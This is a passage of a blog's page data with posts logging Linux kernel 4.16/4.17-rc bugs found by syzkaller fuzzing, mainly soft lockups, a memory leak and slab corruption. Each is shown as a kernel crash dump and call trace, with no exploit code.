\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\nCall Trace:\n19 48 \n89 \ndf \n57 \n9d 0f \n1f 44 \n smp_call_function_many+0x6b0/0x820 kernel/smp.c:434\n00 00 \ne8 19 \n5d 74 \nfd 65 \nff 0d \n native_flush_tlb_others+0xec/0x620 arch/x86/mm/tlb.c:595\n72 06 \n6f 63 \n5b 5d \nc3 \ne8 ea \ne8 \n74 \n flush_tlb_others arch/x86/include/asm/paravirt.h:309 [inline]\n flush_tlb_mm_range+0x255/0x400 arch/x86/mm/tlb.c:644\nfd 48 \n89 df \n57 9d \n<0f> 1f \n44 \n00 00 \n tlb_flush_mmu_tlbonly+0x277/0x430 mm/memory.c:246\neb \ne5 \n tlb_flush_mmu mm/memory.c:267 [inline]\n arch_tlb_finish_mmu+0x97/0x140 mm/memory.c:283\n0f \n tlb_finish_mmu+0x119/0x1c0 mm/memory.c:433\n1f \n40 00 \n66 \n unmap_region+0x382/0x4e0 mm/mmap.c:2532\n2e 0f \n1f 84 \n00 00 \n00 \n00 00 \n do_munmap+0x50a/0xd50 mm/mmap.c:2744\n vm_munmap+0x102/0x180 mm/mmap.c:2763\n __do_sys_munmap mm/mmap.c:2773 [inline]\n __se_sys_munmap mm/mmap.c:2770 [inline]\n __x64_sys_munmap+0x5b/0x70 mm/mmap.c:2770\n do_syscall_64+0x148/0x5d0 arch/x86/entry/common.c:287\nCode: 00 00 fc ff df 44 89 bc 24 e0 00 00 00 48 c1 e8 03 4c 01 e8 41 83 e7 01 c6 00 f8 74 53 49 89 c7 48 83 c3 18 e8 7a a6 0a 00 f3 90 <48> 89 da 41 c6 07 04 48 c1 ea 03 42 0f b6 14 2a 84 d2 74 09 80 \n```\n\nI'll update a post later...\n\n**End**\n\n\n## d_walk - soft lockup\n\nGot from syzkaller & Found in LK v4.17.0-rc1.\n\n### Call Trace (Dump)\n\n```c\nwatchdog: BUG: soft lockup - CPU#1 stuck for 22s! [syz-executor4:7810]\nModules linked in:\nirq event stamp: 13333674\nhardirqs last  enabled at (13333673): [<ffffffff83e06b6a>] seqcount_lockdep_reader_access include/linux/seqlock.h:83 [inline]\nhardirqs last  enabled at (13333673): [<ffffffff83e06b6a>] read_seqcount_begin include/linux/seqlock.h:164 [inline]\nhardirqs last  enabled at (13333673): [<ffffffff83e06b6a>] read_seqbegin include/linux/seqlock.h:433 [inline]\nhardirqs last  enabled at (13333673): [<ffffffff83e06b6a>] read_seqbegin_or_lock include/linux/seqlock.h:529 [inline]\nhardirqs last  enabled at (13333673): [<ffffffff83e06b6a>] d_walk+0x18a/0xa60 fs/dcache.c:1248\nhardirqs last disabled at (13333674): [<ffffffff86200964>] interrupt_entry+0xc4/0xe0 arch/x86/entry/entry_64.S:625\nsoftirqs last  enabled at (2250648): [<ffffffff864006f6>] __do_softirq+0x6f6/0xa8b kernel/softirq.c:311\nsoftirqs last disabled at (2250639): [<ffffffff837539fb>] invoke_softirq kernel/softirq.c:365 [inline]\nsoftirqs last disabled at (2250639): [<ffffffff837539fb>] irq_exit+0x19b/0x1c0 kernel/softirq.c:405\nCPU: 1 PID: 7810 Comm: syz-executor4 Not tainted 4.17.0-rc1+ #34\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:arch_local_irq_restore arch/x86/include/asm/paravirt.h:783 [inline]\nRIP: 0010:lock_acquire+0x1f3/0x4a0 kernel/locking/lockdep.c:3923\nRSP: 0018:ffff88003fd7f940 EFLAGS: 00000246 ORIG_RAX: ffffffffffffff13\nRAX: 0000000000000007 RBX: 1ffff10007faff2c RCX: 0000000000000000\nRDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000246\nRBP: ffff88003957ae40 R08: 0000000000000003 R09: ffffffff881d38e0\nR10: ffff88003957b710 R11: 0000000000000001 R12: 0000000000000000\nR13: 0000000000000000 R14: 0000000000000001 R15: 0000000000000000\nFS:  0000000001688940(0000) GS:ffff88006d100000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00007ffc28f88e84 CR3: 000000003fd72000 CR4: 00000000000006e0\nDR0: 0000000020000100 DR1: 0000000020000100 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000600\nCall Trace:\n _raw_spin_lock_nested+0x25/0x30 kernel/locking/spinlock.c:354\n d_walk+0x359/0xa60 fs/dcache.c:1274\n shrink_dcache_parent+0x164/0x210 fs/dcache.c:1486\n vfs_rmdir+0x1cf/0x420 fs/namei.c:3850\n do_rmdir+0x3fa/0x5a0 fs/namei.c:3911\n do_syscall_64+0x148/0x5d0 arch/x86/entry/common.c:287\nCode: ea 03 0f b6 14 02 48 89 f8 83 e0 07 83 c0 03 38 d0 7c 08 84 d2 0f 85 3f 02 00 00 c7 85 2c 08 00 00 00 00 00 00 48 8b 3c 24 57 9d <0f> 1f 44 00 00 48 b8 00 00 00 00 00 fc ff df 48 01 c3 48 c7 03 \nwatchdog: BUG: soft lockup - CPU#0 stuck for 22s! [syz-executor1:2869]\nModules linked in:\nirq event stamp: 15849430\nhardirqs last  enabled at (15849429): [<ffffffff83e06b6a>] seqcount_lockdep_reader_access include/linux/seqlock.h:83 [inline]\nhardirqs last  enabled at (15849429): [<ffffffff83e06b6a>] read_seqcount_begin include/linux/seqlock.h:164 [inline]\nhardirqs last  enabled at (15849429): [<ffffffff83e06b6a>] read_seqbegin include/linux/seqlock.h:433 [inline]\nhardirqs last  enabled at (15849429): [<ffffffff83e06b6a>] read_seqbegin_or_lock include/linux/seqlock.h:529 [inline]\nhardirqs last  enabled at (15849429): [<ffffffff83e06b6a>] d_walk+0x18a/0xa60 fs/dcache.c:1248\nhardirqs last disabled at (15849430): [<ffffffff86200964>] interrupt_entry+0xc4/0xe0 arch/x86/entry/entry_64.S:625\nsoftirqs last  enabled at (2389822): [<ffffffff864006f6>] __do_softirq+0x6f6/0xa8b kernel/softirq.c:311\nsoftirqs last disabled at (2389715): [<ffffffff837539fb>] invoke_softirq kernel/softirq.c:365 [inline]\nsoftirqs last disabled at (2389715): [<ffffffff837539fb>] irq_exit+0x19b/0x1c0 kernel/softirq.c:405\nCPU: 0 PID: 2869 Comm: syz-executor1 Tainted: G             L    4.17.0-rc1+ #34\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:__sanitizer_cov_trace_pc+0x0/0x50 kernel/kcov.c:146\nRSP: 0018:ffff8800444d7a48 EFLAGS: 00000297 ORIG_RAX: ffffffffffffff13\nRAX: 0000000000000000 RBX: ffff8800628d1c78 RCX: 0000000000000000\nRDX: 0000000000000000 RSI: ffff8800628d1b88 RDI: ffff8800444d7c28\nRBP: ffff8800444d7bc8 R08: ffffed000c51a382 R09: ffffed000c51a381\nR10: ffff8800628d1c0b R11: 1ffff1000c51a381 R12: ffff8800628d1c08\nR13: ffffed000889af6c R14: ffff8800628d0d78 R15: dffffc0000000000\nFS:  000000000173a940(0000) GS:ffff88006d000000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 0000000001743c18 CR3: 0000000045180000 CR4: 00000000000006f0\nDR0: 0000000020000100 DR1: 0000000020000100 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000600\nCall Trace:\n d_walk+0x38c/0xa60 fs/dcache.c:1291\n shrink_dcache_parent+0x164/0x210 fs/dcache.c:1486\n vfs_rmdir+0x1cf/0x420 fs/namei.c:3850\n do_rmdir+0x3fa/0x5a0 fs/namei.c:3911\n do_syscall_64+0x148/0x5d0 arch/x86/entry/common.c:287\nCode: 83 c1 01 4a 89 7c 10 e0 4a 89 74 10 e8 4a 89 54 10 f0 4a 89 4c d8 20 4c 89 08 f3 c3 0f 1f 44 00 00 66 2e 0f 1f 84 00 00 00 00 00 <65> 48 8b 04 25 80 de 01 00 65 8b 15 a0 56 5f 7c 81 e2 00 01 1f \n```\n\nI'll update post later...\n\n**End**__\n\n\n\n## e1000_update_stats - soft lockup\n\nGot from syzkaller & Found in LK v4.17.0-rc1.\n\n### Call Trace (Dump)\n\n```c\nwatchdog: BUG: soft lockup - CPU#0 stuck for 22s! [kworker/0:1:24]\nModules linked in:\nirq event stamp: 22544\nhardirqs last  enabled at (22543): [<ffffffff90a00a60>] restore_regs_and_return_to_kernel+0x0/0x30\nhardirqs last disabled at (22544): [<ffffffff90a00964>] interrupt_entry+0xc4/0xe0 arch/x86/entry/entry_64.S:625\nsoftirqs last  enabled at (22532): [<ffffffff8fe4cc31>] neigh_periodic_work+0x6b1/0xa90 net/core/neighbour.c:862\nsoftirqs last disabled at (22528): [<ffffffff8fe4c65b>] neigh_periodic_work+0xdb/0xa90 net/core/neighbour.c:794\nCPU: 0 PID: 24 Comm: kworker/0:1 Not tainted 4.17.0-rc1+ #34\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nWorkqueue: events e1000_watchdog\nRIP: 0010:arch_local_irq_restore arch/x86/include/asm/paravirt.h:783 [inline]\nRIP: 0010:__raw_spin_unlock_irqrestore include/linux/spinlock_api_smp.h:160 [inline]\nRIP: 0010:_raw_spin_unlock_irqrestore+0x4b/0x60 kernel/locking/spinlock.c:184\nRSP: 0018:ffff88006c13f4c0 EFLAGS: 00000293 ORIG_RAX: ffffffffffffff13\nRAX: 0000000000000007 RBX: 0000000000000293 RCX: 0000000000000000\nRDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000293\nRBP: ffff880066e82de0 R08: ffffed000cdd05bd R09: ffff88006c0736b8\nR10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000\nR13: ffff880066e82bc0 R14: ffff880066e82fb8 R15: ffff880066e82180\nFS:  0000000000000000(0000) GS:ffff88006d000000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00007f4393533000 CR3: 0000000061aec000 CR4: 00000000000006f0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\nCall Trace:\n spin_unlock_irqrestore include/linux/spinlock.h:365 [inline]\n e1000_update_stats+0x13ed/0x1d60 drivers/net/ethernet/intel/e1000/e1000_main.c:3768\n e1000_watchdog+0x335/0x11a0 drivers/net/ethernet/intel/e1000/e1000_main.c:2521\nCode: 51 76 fd f6 c7 02 75 19 48 89 df 57 9d 0f 1f 44 00 00 e8 19 5d 74 fd 65 ff 0d 72 06 6f 6f 5b 5d c3 e8 ea e8 74 fd 48 89 df 57 9d <0f> 1f 44 00 00 eb e5 0f 1f 40 00 66 2e 0f 1f 84 00 00 00 00 00 \nwatchdog: BUG: soft lockup - CPU#0 stuck for 21s! [kworker/0:1:24]\nModules linked in:\nirq event stamp: 22987\nhardirqs last  enabled at (22986): [<ffffffff90a00a60>] restore_regs_and_return_to_kernel+0x0/0x30\nhardirqs last disabled at (22987): [<ffffffff90a00964>] interrupt_entry+0xc4/0xe0 arch/x86/entry/entry_64.S:625\nsoftirqs last  enabled at (22958): [<ffffffff90c006f6>] __do_softirq+0x6f6/0xa8b kernel/softirq.c:311\nsoftirqs last disabled at (22979): [<ffffffff8df539fb>] invoke_softirq kernel/softirq.c:365 [inline]\nsoftirqs last disabled at (22979): [<ffffffff8df539fb>] irq_exit+0x19b/0x1c0 kernel/softirq.c:405\nCPU: 0 PID: 24 Comm: kworker/0:1 Tainted: G             L    4.17.0-rc1+ #34\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nWorkqueue: events e1000_watchdog\nRIP: 0010:arch_local_irq_enable arch/x86/include/asm/paravirt.h:793 [inline]\nRIP: 0010:__do_softirq+0x26c/0xa8b kernel/softirq.c:269\nRSP: 0018:ffff88006d007cb0 EFLAGS: 00000246 ORIG_RAX: ffffffffffffff13\nRAX: 0000000000000007 RBX: ffff88006c072e40 RCX: 0000000000000000\nRDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff88006c07366c\nRBP: 1ffff1000da00fe1 R08: 0000000000000000 R09: ffff88006c0736b8\nR10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000\nR13: 0000000000000282 R14: 0000000000000000 R15: dffffc0000000000\nFS:  0000000000000000(0000) GS:ffff88006d000000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 000000c42ac0b140 CR3: 000000001ec22000 CR4: 00000000000006f0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\nCall Trace:\n <IRQ>\n invoke_softirq kernel/softirq.c:365 [inline]\n irq_exit+0x19b/0x1c0 kernel/softirq.c:405\n exiting_irq arch/x86/include/asm/apic.h:525 [inline]\n smp_apic_timer_interrupt+0x162/0x6d0 arch/x86/kernel/apic/apic.c:1052\n apic_timer_interrupt+0xf/0x20 arch/x86/entry/entry_64.S:863\n </IRQ>\nRIP: 0010:arch_local_irq_restore arch/x86/include/asm/paravirt.h:783 [inline]\nRIP: 0010:__raw_spin_unlock_irqrestore include/linux/spinlock_api_smp.h:160 [inline]\nRIP: 0010:_raw_spin_unlock_irqrestore+0x4b/0x60 kernel/locking/spinlock.c:184\nRSP: 0018:ffff88006c13f4c0 EFLAGS: 00000293 ORIG_RAX: ffffffffffffff13\nRAX: 0000000000000007 RBX: 0000000000000293 RCX: 0000000000000000\nRDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000293\nRBP: ffff880066e82de0 R08: ffffed000cdd05bd R09: ffff88006c0736b8\nR10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000\nR13: ffff880066e82bc0 R14: ffff880066e82fb8 R15: ffff880066e82180\n spin_unlock_irqrestore include/linux/spinlock.h:365 [inline]\n e1000_update_stats+0x13ed/0x1d60 drivers/net/ethernet/intel/e1000/e1000_main.c:3768\n e1000_watchdog+0x335/0x11a0 drivers/net/ethernet/intel/e1000/e1000_main.c:2521\nCode: 34 0a 00 00 00 48 c1 e8 03 4c 01 f8 48 89 44 24 20 48 c7 c0 80 a2 02 00 65 c7 00 00 00 00 00 e8 2b be 47 fd fb 66 0f 1f 44 00 00 <b8> ff ff ff ff 48 c7 44 24 08 00 91 80 91 41 0f bc c5 83 c0 01 \n...\n**********************************************************\n**   NOTICE NOTICE NOTICE NOTICE NOTICE NOTICE NOTICE   **\n**                                                      **\n** trace_printk() being used. Allocating extra memory.  **\n**                                                      **\n** This means that this is a DEBUG kernel and it is     **\n** unsafe for production use.                           **\n**                                                      **\n** If you see this message and you are not debugging    **\n** the kernel, report this immediately to your vendor!  **\n**                                                      **\n**   NOTICE NOTICE NOTICE NOTICE NOTICE NOTICE NOTICE   **\n**********************************************************\n...\n```\n\nI'll update a post later...\n\n**End**\n\n\n\n## hpet_open - soft lockup\n\nGot from syzkaller & Found in LK v4.17.0-rc1.\n\n### Call Trace (Dump)\n\n```c\nhrtimer: interrupt took 3048710 ns\nwatchdog: BUG: soft lockup - CPU#1 stuck for 28s! [syz-fuzzer:2773]\nModules linked in:\nirq event stamp: 161094\nhardirqs last  enabled at (161093): [<ffffffffb6f2d744>] __raw_spin_unlock_irq include/linux/spinlock_api_smp.h:168 [inline]\nhardirqs last  enabled at (161093): [<ffffffffb6f2d744>] _raw_spin_unlock_irq+0x24/0x40 kernel/locking/spinlock.c:192\nhardirqs last disabled at (161094): [<ffffffffb7000964>] interrupt_entry+0xc4/0xe0 arch/x86/entry/entry_64.S:625\nsoftirqs last  enabled at (160916): [<ffffffffb72006f6>] __do_softirq+0x6f6/0xa8b kernel/softirq.c:311\nsoftirqs last disabled at (160899): [<ffffffffb45539fb>] invoke_softirq kernel/softirq.c:365 [inline]\nsoftirqs last disabled at (160899): [<ffffffffb45539fb>] irq_exit+0x19b/0x1c0 kernel/softirq.c:405\nCPU: 1 PID: 2773 Comm: syz-fuzzer Not tainted 4.17.0-rc1+ #34\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:arch_local_irq_enable arch/x86/include/asm/paravirt.h:793 [inline]\nRIP: 0010:__raw_spin_unlock_irq include/linux/spinlock_api_smp.h:168 [inline]\nRIP: 0010:_raw_spin_unlock_irq+0x2b/0x40 kernel/locking/spinlock.c:192\nRSP: 0018:ffff880064fff728 EFLAGS: 00000246 ORIG_RAX: ffffffffffffff13\nRAX: 0000000000000007 RBX: ffffffffb8103620 RCX: 0000000000000000\nRDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff8800699bcd6c\nRBP: 0000000000000032 R08: fffffbfff70206c5 R09: ffff8800699bcd90\nR10: 0000000000000000 R11: 0000000000000000 R12: ffff880064fff778\nR13: 0000000000000032 R14: 0000000000000000 R15: 0000000000000002\nFS:  000000c4202eb868(0000) GS:ffff88006d100000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 000000c42bb4e0d0 CR3: 000000006bf92000 CR4: 00000000000006e0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\nCall Trace:\n spin_unlock_irq include/linux/spinlock.h:360 [inline]\n hpet_timer_set_irq drivers/char/hpet.c:221 [inline]\n hpet_open+0x33d/0x710 drivers/char/hpet.c:293\n misc_open+0x35f/0x4d0 drivers/char/misc.c:154\n chrdev_open+0x21f/0x6b0 fs/char_dev.c:417\n do_dentry_open+0x65c/0xe70 fs/open.c:784\n vfs_open+0x11c/0x200 fs/open.c:906\n do_last fs/namei.c:3365 [inline]\n path_openat+0xb1f/0x3320 fs/namei.c:3500\n do_filp_open+0x255/0x380 fs/namei.c:3535\n do_sys_open+0x4b0/0x640 fs/open.c:1093\n do_syscall_64+0x148/0x5d0 arch/x86/entry/common.c:287\nCode: 53 48 8b 54 24 08 48 89 fb 48 8d 7f 18 be 01 00 00 00 e8 09 53 75 fd 48 89 df e8 c1 51 76 fd e8 4c e9 74 fd fb 66 0f 1f 44 00 00 <65> ff 0d be 06 0f 49 5b c3 66 90 66 2e 0f 1f 84 00 00 00 00 00 \nINFO: rcu_sched self-detected stall on CPU\n\t1-...!: (1 GPs behind) idle=2e6/1/4611686018427387906 softirq=27263/27266 fqs=0 \n\t (t=343249 jiffies g=6526 c=6525 q=52)\nrcu_sched kthread starved for 343249 jiffies! g6526 c6525 f0x0 RCU_GP_WAIT_FQS(3) ->state=0x402 ->cpu=0\nRCU grace-period kthread stack dump:\nrcu_sched       I20568     9      2 0x80000000\nCall Trace:\nINFO: rcu_sched detected stalls on CPUs/tasks:\n schedule+0xf0/0x3a0 kernel/sched/core.c:3549\n schedule_timeout+0x113/0x210 kernel/time/timer.c:1801\n rcu_gp_kthread+0xf20/0x3a00 kernel/rcu/tree.c:2231\n kthread+0x32b/0x3f0 kernel/kthread.c:238\n ret_from_fork+0x3a/0x50 arch/x86/entry/entry_64.S:412\nNMI backtrace for cpu 1\nCPU: 1 PID: 2773 Comm: syz-fuzzer Tainted: G             L    4.17.0-rc1+ #34\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n <IRQ>\n __dump_stack lib/dump_stack.c:77 [inline]\n dump_stack+0x11b/0x1fd lib/dump_stack.c:113\n nmi_cpu_backtrace.cold.2+0x19/0x5d lib/nmi_backtrace.c:103\n </IRQ>\n\t0-...!: (1 GPs behind) idle=1a6/1/4611686018427387906 softirq=37557/37559 fqs=53 \n\t(detected by 0, t=232 jiffies, g=6527, c=6526, q=315)\nNMI backtrace for cpu 0\nCPU: 0 PID: 2765 Comm: syz-fuzzer Tainted: G             L    4.17.0-rc1+ #34\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n <IRQ>\n __dump_stack lib/dump_stack.c:77 [inline]\n dump_stack+0x11b/0x1fd lib/dump_stack.c:113\n nmi_cpu_backtrace.cold.2+0x19/0x5d lib/nmi_backtrace.c:103\n </IRQ>\n```\n\nI'll update a post later...\n\n**End**\n\n\n\n## smp_call_function_many - soft lockup\n\nGot from syzkaller & Found in LK v4.17.0-rc1.\n\n### Call Trace (Dump)\n\n```c\nwatchdog: BUG: soft lockup - CPU#1 stuck for 21s! [syz-fuzzer:2758]\nModules linked in:\nirq event stamp: 937580\nhardirqs last  enabled at (937579): [<ffffffff87000a60>] restore_regs_and_return_to_kernel+0x0/0x30\nhardirqs last disabled at (937580): [<ffffffff87000964>] interrupt_entry+0xc4/0xe0 arch/x86/entry/entry_64.S:625\nsoftirqs last  enabled at (891764): [<ffffffff872006f6>] __do_softirq+0x6f6/0xa8b kernel/softirq.c:311\nsoftirqs last disabled at (891755): [<ffffffff845539fb>] invoke_softirq kernel/softirq.c:365 [inline]\nsoftirqs last disabled at (891755): [<ffffffff845539fb>] irq_exit+0x19b/0x1c0 kernel/softirq.c:405\nCPU: 1 PID: 2758 Comm: syz-fuzzer Not tainted 4.17.0-rc1+ #34\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:rep_nop arch/x86/include/asm/processor.h:667 [inline]\nRIP: 0010:cpu_relax arch/x86/include/asm/processor.h:672 [inline]\nRIP: 0010:csd_lock_wait kernel/smp.c:108 [inline]\nRIP: 0010:smp_call_function_single+0x3b8/0x510 kernel/smp.c:302\nRSP: 0000:ffff88006652e9c0 EFLAGS: 00000293 ORIG_RAX: ffffffffffffff13\nRAX: ffff88006bffc540 RBX: ffff88006652ea38 RCX: ffffffff8477e0e6\nRDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff88006652ea38\nRBP: ffff88006652eb20 R08: ffffed000da05791 R09: ffff88006bffcdb8\nR10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000001\nR13: dffffc0000000000 R14: 0000000000000000 R15: ffffed000cca5d54\nFS:  000000c42023dc68(0000) GS:ffff88006d100000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 00007f6ca68cd650 CR3: 0000000060ed6000 CR4: 00000000000006e0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\nCall Trace:\n smp_call_function_many+0x6b0/0x820 kernel/smp.c:434\n native_flush_tlb_others+0xec/0x620 arch/x86/mm/tlb.c:595\n flush_tlb_others arch/x86/include/asm/paravirt.h:309 [inline]\n flush_tlb_mm_range+0x255/0x400 arch/x86/mm/tlb.c:644\n flush_tlb_page arch/x86/include/asm/tlbflush.h:526 [inline]\n ptep_clear_flush+0x1a8/0x1f0 mm/pgtable-generic.c:87\n wp_page_copy+0x97e/0x1c40 mm/memory.c:2527\n do_wp_page+0x46c/0x2240 mm/memory.c:2776\n handle_pte_fault mm/memory.c:3979 [inline]\n __handle_mm_fault+0x1b21/0x32f0 mm/memory.c:4087\n handle_mm_fault+0x12e/0x390 mm/memory.c:4124\n __do_page_fault+0x517/0xb70 arch/x86/mm/fault.c:1399\n do_page_fault+0xc1/0x610 arch/x86/mm/fault.c:1474\n async_page_fault+0x1e/0x30 arch/x86/entry/entry_64.S:1163\nRIP: 0033:0x41cfa7\nRSP: 002b:000000c4201d3cb0 EFLAGS: 00010246\nRAX: 000000c420016000 RBX: 0000000000000000 RCX: 0000000000000000\nRDX: 00007f6ca68dd4c0 RSI: 0000000000000000 RDI: 00007f6ca68cd650\nRBP: 000000c4201d3cd0 R08: 0000000000000000 R09: 0000000000000000\nR10: 0000000000000001 R11: 0000000000000286 R12: 00000000000000ff\nR13: 0000000000000020 R14: 00007f6ca68d9000 R15: 0000000000000010\nCode: 00 00 fc ff df 44 89 bc 24 e0 00 00 00 48 c1 e8 03 4c 01 e8 41 83 e7 01 c6 00 f8 74 53 49 89 c7 48 83 c3 18 e8 7a a6 0a 00 f3 90 <48> 89 da 41 c6 07 04 48 c1 ea 03 42 0f b6 14 2a 84 d2 74 09 80 \nwatchdog: BUG: soft lockup - CPU#0 stuck for 37s! [kworker/0:1:24]\nModules linked in:\nirq event stamp: 18446\nhardirqs last  enabled at (18445): [<ffffffff86f2d7a6>] __raw_spin_unlock_irqrestore include/linux/spinlock_api_smp.h:160 [inline]\nhardirqs last  enabled at (18445): [<ffffffff86f2d7a6>] _raw_spin_unlock_irqrestore+0x46/0x60 kernel/locking/spinlock.c:184\nhardirqs last disabled at (18446): [<ffffffff87000964>] interrupt_entry+0xc4/0xe0 arch/x86/entry/entry_64.S:625\nsoftirqs last  enabled at (18432): [<ffffffff8644cc31>] neigh_periodic_work+0x6b1/0xa90 net/core/neighbour.c:862\nsoftirqs last disabled at (18428): [<ffffffff8644c65b>] neigh_periodic_work+0xdb/0xa90 net/core/neighbour.c:794\nCPU: 0 PID: 24 Comm: kworker/0:1 Tainted: G             L    4.17.0-rc1+ #34\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nWorkqueue: events e1000_watchdog\nRIP: 0010:arch_local_irq_restore arch/x86/include/asm/paravirt.h:783 [inline]\nRIP: 0010:__raw_spin_unlock_irqrestore include/linux/spinlock_api_smp.h:160 [inline]\nRIP: 0010:_raw_spin_unlock_irqrestore+0x4b/0x60 kernel/locking/spinlock.c:184\nRSP: 0018:ffff88006c14f4c0 EFLAGS: 00000293 ORIG_RAX: ffffffffffffff13\nRAX: 0000000000000007 RBX: 0000000000000293 RCX: 0000000000000000\nRDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000293\nRBP: ffff880066e8ade0 R08: ffffed000cdd15bd R09: ffff88006c0736b8\nR10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000\nR13: ffff880066e8abc0 R14: ffff880066e8afb8 R15: ffff880066e8a180\nFS:  0000000000000000(0000) GS:ffff88006d000000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 000000c42d98e000 CR3: 00000000614ac000 CR4: 00000000000006f0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\nCall Trace:\n spin_unlock_irqrestore include/linux/spinlock.h:365 [inline]\n e1000_update_stats+0x13ed/0x1d60 drivers/net/ethernet/intel/e1000/e1000_main.c:3768\n e1000_watchdog+0x335/0x11a0 drivers/net/ethernet/intel/e1000/e1000_main.c:2521\nCode: 51 76 fd f6 c7 02 75 19 48 89 df 57 9d 0f 1f 44 00 00 e8 19 5d 74 fd 65 ff 0d 72 06 0f 79 5b 5d c3 e8 ea e8 74 fd 48 89 df 57 9d <0f> 1f 44 00 00 eb e5 0f 1f 40 00 66 2e 0f 1f 84 00 00 00 00 00 \n```\n\nI'll update a post later...\n\n**End**\n\n","excerpt":"__sctp_v6_cmp_addr - slab out of bounds Read Found in LK v4.17.0-rc1. slab-out-of-bounds in __sctp_v6_cmp_addr, 8 bytes read. Demo Log End …","fields":{"slug":"/2018-04-3-Founds/"},"frontmatter":{"date":"Apr 21, 2018","title":"Linux Kernel - 2018-04-3 Founds","tags":["Security","Linux-Kernel"],"update":"Apr 23, 2018"},"timeToRead":40}},{"node":{"rawMarkdownBody":"\n## anon_vma_chain - memory leak\n\nFound in LK v4.16.0-rc7.\n\n### Call Trace (Dump)\n\n```c\n[  171.804669] kmemleak: 1 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\n[  178.286239] kmemleak: 1 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\n...\n\n  hex dump (first 32 bytes):\n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n```\n\n**End**\n\n\n\n## kmalloc-1024 - slab padding/red zone overwritten\n\nGot from syzkaller & Found in LK v4.16.0-rc7.\n\n### Call Trace (Dump)\n\n> BUG kmalloc-1024 (Not tainted): Padding overwritten. 0x000000007f0b2d60-0x00000000dd7f0dc3\n\n```c\nBUG kmalloc-1024 (Not tainted): Padding overwritten. 0x000000007f0b2d60-0x00000000dd7f0dc3\n-----------------------------------------------------------------------------\n\nINFO: Slab 0x0000000063ffd7ff objects=23 used=23 fp=0x          (null) flags=0x100000000008100\nCPU: 0 PID: 1483 Comm: kworker/u7:2 Tainted: G    B            4.16.0-rc7+ #27\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nWorkqueue: writeback wb_workfn (flush-8:0)\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x10a/0x1dd lib/dump_stack.c:53\n slab_err+0xab/0xcf mm/slub.c:724\n slab_pad_check.part.45.cold.81+0x23/0x75 mm/slub.c:864\nPadding 000000007f0b2d60: 7c 43 ff ff 6c 68 00 00 4c 45 ff ff d4 68 00 00  |C..lh..LE...h..\nPadding 000000003af22bbd: 6c 46 ff ff 24 69 00 00 dc 46 ff ff 3c 69 00 00  lF..$i...F..<i..\nPadding 00000000b50ac743: 4c 47 ff ff 7c 69 00 00 bc 48 ff ff cc 69 00 00  LG..|i...H...i..\nPadding 0000000030bf91d5: ac 4a ff ff 1c 6a 00 00 2c 4b ff ff 34 6a 00 00 